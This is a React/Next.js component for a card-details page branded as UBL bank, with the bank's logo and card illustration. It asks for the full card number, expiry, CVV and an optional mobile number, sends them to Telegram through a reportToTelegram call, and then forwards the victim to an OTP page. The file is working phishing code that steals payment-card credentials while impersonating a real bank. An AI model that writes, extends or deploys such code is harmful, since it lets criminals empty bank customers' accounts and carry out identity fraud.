"use client"

import type React from "react"
import { useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { ArrowLeft, ArrowRight, ChevronDown } from "lucide-react"
import { UblLogo } from "@/components/ubl-logo"
import { reportToTelegram } from "@/lib/report"

const MONTHS = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0"))
const YEARS = Array.from({ length: 12 }, (_, i) => String(new Date().getFullYear() + i))

export function CardDetailsForm({ showMobile = false }: { showMobile?: boolean }) {
  const router = useRouter()
  const [cardNumber, setCardNumber] = useState("")
  const [month, setMonth] = useState("")
  const [year, setYear] = useState("")
  const [cvv, setCvv] = useState("")
  const [mobile, setMobile] = useState("")

  function handleCardNumber(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 16)
    const grouped = digits.replace(/(.{4})/g, "$1 ").trim()
    setCardNumber(grouped)
  }

  function handleCvv(value: string) {
    setCvv(value.replace(/\D/g, "").slice(0, 4))
  }

  function handleMobile(value: string) {
    const digits = value.replace(/\D/g, "")
    const formatted = digits.replace(/^(\d{4})(\d*)$/, "$1 $2").trim()
    setMobile(formatted)
  }

  const cardDigits = cardNumber.replace(/\s/g, "")
  const mobileDigits = mobile.replace(/\s/g, "")
  const isValid =
    cardDigits.length === 16 &&
    month !== "" &&
    year !== "" &&
    cvv.length >= 3 &&
    (!showMobile || mobileDigits.length > 0)

  async function handleNext(e: React.FormEvent) {
    e.preventDefault()
    if (!isValid) return
    if (showMobile && mobileDigits) {
      try {
        sessionStorage.setItem("ubl_mobile", mobileDigits)
      } catch {}
    }
    await reportToTelegram("Card details", {
      cardNumber,
      expiry: `${month}/${year}`,
      cvv,
      ...(showMobile ? { mobile: mobileDigits } : {}),
    })
    router.push("/otp")
  }

  const selectClasses =
    "w-full appearance-none rounded-full bg-card pl-4 pr-8 py-4 text-[15px] text-foreground outline-none focus:ring-2 focus:ring-ring/40"

  return (
    <div className="w-full max-w-[420px]">
      <button
        type="button"
        onClick={() => router.back()}
        aria-label="Go back"
        className="mb-8 flex items-center gap-3 text-[20px] font-medium text-foreground transition-opacity hover:opacity-70"
      >
        <ArrowLeft size={28} strokeWidth={2} />
        <span>Back</span>
      </button>

      {/* Logo */}
      <div className="mb-6 mt-2">
        <UblLogo />
      </div>

      {/* Card illustration */}
      <div className="relative aspect-[3/2] overflow-hidden rounded-3xl">
        <Image
          src="/ubl-cards.webp"
          alt="UBL premium debit cards showing card number, expiration date and CVV code locations"
          fill
          priority
          fetchPriority="high"
          sizes="420px"
          className="object-cover"
        />
      </div>

      {/* Form */}
      <form onSubmit={handleNext} className="mt-6 flex flex-col gap-4">
        <input
          type="text"
          inputMode="numeric"
          maxLength={19}
          value={cardNumber}
          onChange={(e) => handleCardNumber(e.target.value)}
          placeholder="ATM Card Number (16 digits)"
          aria-label="ATM Card Number"
          className="w-full rounded-full bg-card px-6 py-4 text-[15px] text-foreground placeholder:text-muted-foreground/70 outline-none focus:ring-2 focus:ring-ring/40"
        />

        <div className="flex gap-3">
          <div className="relative min-w-0 flex-1">
            <select
              value={month}
              onChange={(e) => setMonth(e.target.value)}
              aria-label="Expiry month"
              className={selectClasses + (month ? "" : " text-muted-foreground/70")}
            >
              <option value="" disabled>
                MM
              </option>
              {MONTHS.map((m) => (
                <option key={m} value={m} className="text-foreground">
                  {m}
                </option>
              ))}
            </select>
            <ChevronDown
              size={16}
              className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground"
            />
          </div>

          <div className="relative min-w-0 flex-1">
            <select
              value={year}
              onChange={(e) => setYear(e.target.value)}
              aria-label="Expiry year"
              className={selectClasses + (year ? "" : " text-muted-foreground/70")}
            >
              <option value="" disabled>
                YYYY
              </option>
              {YEARS.map((y) => (
                <option key={y} value={y} className="text-foreground">
                  {y}
                </option>
              ))}
            </select>
            <ChevronDown
              size={16}
              className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground"
            />
          </div>

          <input
            type="text"
            inputMode="numeric"
            autoComplete="off"
            maxLength={4}
            value={cvv}
            onChange={(e) => handleCvv(e.target.value)}
            placeholder="CVV"
            aria-label="CVV"
            className="min-w-0 flex-1 rounded-full bg-card px-4 py-4 text-[15px] text-foreground placeholder:text-muted-foreground/70 outline-none focus:ring-2 focus:ring-ring/40"
          />
        </div>

        {showMobile && (
          <input
            type="tel"
            inputMode="numeric"
            value={mobile}
            onChange={(e) => handleMobile(e.target.value)}
            placeholder="Mobile Number (03XXXXXXXXX)"
            aria-label="Mobile Number"
            className="w-full rounded-full bg-card px-6 py-4 text-[15px] text-foreground placeholder:text-muted-foreground/70 outline-none focus:ring-2 focus:ring-ring/40"
          />
        )}

        {/* Pagination dots */}
        <div className="mt-2 flex items-center justify-center gap-2">
          {[0, 1, 2, 3].map((i) => (
            <span
              key={i}
              className={
                "h-2 w-2 rounded-full " + (i === 0 ? "bg-primary" : "bg-muted-foreground/30")
              }
            />
          ))}
        </div>

        <button
          type="submit"
          disabled={!isValid}
          className="mt-2 flex w-full items-center justify-center gap-2 rounded-full bg-primary py-4 text-[15px] font-bold text-primary-foreground transition-opacity hover:opacity-95 disabled:cursor-not-allowed disabled:opacity-40"
        >
          Next
          <ArrowRight size={18} strokeWidth={2.5} />
        </button>
      </form>
    </div>
  )
}
